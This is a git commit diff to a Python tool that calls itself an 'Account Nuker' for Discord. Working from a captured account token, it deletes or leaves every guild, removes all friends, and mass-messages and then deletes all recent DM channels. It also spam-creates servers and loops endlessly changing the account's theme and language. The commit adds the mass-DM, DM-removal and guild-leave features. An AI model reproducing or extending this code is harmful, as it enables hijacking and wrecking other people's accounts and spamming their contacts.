d8d1417cf7d99538c838b94b25f72d991e110faa
Leafy <60797172+iiLeafy@users.noreply.github.com>
2020-11-21 10:48:29 +0200

    Added more stuff such as recent dm remover, mass dm recent dms and guild leaver [for whatever reason i didnt have it before]

--- jajaja.py
+++ jajaja.py
@@ -9,6 +9,7 @@ from itertools import cycle
 init(convert=True)
 guildsIds = []
 friendsIds = []
+channelIds = []
 clear = lambda: os.system('cls')
 clear()
 
@@ -19,6 +20,9 @@ class Login(discord.Client):
  
         for f in self.user.friends:
             friendsIds.append(f.id)
+
+        for c in self.private_channels:
+            channelIds.append(c.id)
 
         await self.logout()
 
@@ -69,50 +73,86 @@ def tokenInfo(token):
 
 def tokenFuck(token):
     headers = {'Authorization': token}
-    gdel = input('Would you like to delete all guilds on this account. y/n [No Capitals] > ')
+    gdel = input(f'Would you like to delete all guilds on this account. y/n [No Capitals] > ')
     fdel = input('Would you like to remove all friends on this account. y/n [No Capitals] > ')
+    sendall = input('Would you like to send a dm to all recent dms on this account. y/n [No Capitals] > ')
+    fremove = input('Would you like to remove all recent dms on this account. y/n [No Capitals] > ')
+    gleave = input('Would you like to leave all guilds on this account. y/n [No Capitals] > ')
     gcreate = input('Would you like to spam create guilds on this account.  y/n [No Capitals] > ')
     dlmode = input('Would you like to spam change through light and dark mode. y/n [No Capitals] > ')
     langspam = input('Would you like to spam change the user\'s language. y/n [No Capitals] > ')
     print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")
 
+    if gleave == 'y':
+        try:
+            for guild in guildsIds:
+                requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
+                print(f'Left guild {guild}')
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
+
     if fdel == 'y':
-        for friend in friendsIds:
-            requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
+        try:
+            for friend in friendsIds:
+                requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
+                print(f'Removed friend {friend}')
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
+
+    if sendall == 'y':
+        try:
+            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
+            for id in channelIds:
+                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
+                print(f'Sent message to private channel ID of {id}')
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
+
+    if fremove == 'y':
+        try:
+            for id in channelIds:
+                requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
+                print(f'Removed private channel ID {id}')
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
 
     if gdel == 'y':
-        for guild in guildsIds:
-            requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
+        try:
+            for guild in guildsIds:
+                requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
+                print(f'Deleted guild {guild}')
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
 
     if gcreate == 'y':
-        gname = input('What would you like the spammed server name be. > ')
-        gserv = input('How many servers would you like to be made. [max is 100 by discord]')
-        for i in range(int(gserv)):
-            payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
-            requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
-            print(f'Server {gname} made. Count: {i}')
+        try:
+            gname = input('What would you like the spammed server name be. > ')
+            gserv = input('How many servers would you like to be made. [max is 100 by discord]')
+            for i in range(int(gserv)):
+                payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
+                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
+                print(f'Server {gname} made. Count: {i}')
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
 
     if dlmode == 'y':
-        modes = cycle(["light", "dark"])
+        try:
+            modes = cycle(["light", "dark"])
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
 
     if langspam == 'y':
-        while True:
-            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
-            requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
+        try:
+            while True:
+                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
+                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
+
+    time.sleep(9999)
 
 def getBanner():
     banner = f'''
-                ▄▄▄██▀▀ ▄▄▄          ▄▄▄██▀▀▀ ▄▄▄          ▄▄▄██▀▀ ▄▄▄      
-                  ░██  ░████▄          ░██   ░████▄          ░██  ░████▄    
-                  ░██  ░██  ▀█▄        ░██   ░██  ▀█▄        ░██  ░██  ▀█▄  
-               ░██▄██░ ░██▄▄▄▄██    ░██▄██░  ░██▄▄▄▄██    ░██▄██░ ░██▄▄▄▄██ 
-                ░███░   ██   ██░     ░███░    ██   ░██░    ░███░   ██░  ░██░
-                 ░█░░░   ░░  █░█░     ░█░░░   ░░    █░█░    ░░█░░░   ░░  █░█░
-                ░ ░░░    ░   ░░ ░    ░ ░░░    ░   ░░ ░    ░ ░░░    ░   ░░ ░     {Fore.RED}({Fore.RESET}Account Nuker{Fore.RED}){Fore.RESET}
-                ░ ░ ░    ░   ░       ░ ░ ░    ░   ░       ░ ░ ░    ░   ░          - MassDM removed...
-                ░   ░        ░  ░    ░   ░        ░  ░    ░   ░        ░  ░       + Token info added
-                                                                                  + Token login added ({Fore.RED}needs chromedriver.exe{Fore.RESET})
-        
                 [{Fore.RED}1{Fore.RESET}] Token fuck the account
                 [{Fore.RED}2{Fore.RESET}] Grab info about the account
                 [{Fore.RED}3{Fore.RESET}] Log into a token
